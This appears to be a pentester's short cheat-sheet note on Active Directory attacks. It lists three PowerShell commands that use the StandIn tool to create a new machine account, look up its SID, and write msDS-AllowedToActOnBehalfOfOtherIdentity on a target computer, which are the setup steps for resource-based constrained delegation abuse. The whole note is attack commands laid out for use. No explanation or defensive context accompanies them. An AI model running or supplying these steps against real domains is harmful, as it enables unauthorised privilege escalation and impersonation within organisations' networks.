
```powershell
.\standin.exe --computer xcl --make # create new pc 

Get-ADComputer -Filter * | Select-Object Name, SID # get SID 

.\standin.exe --computer ResourceDC --sid <SID> # set msDS-AllowedToActOnBehalfOfOtherIdentity to true
```

--- 
Tags: #AD #delegation #standin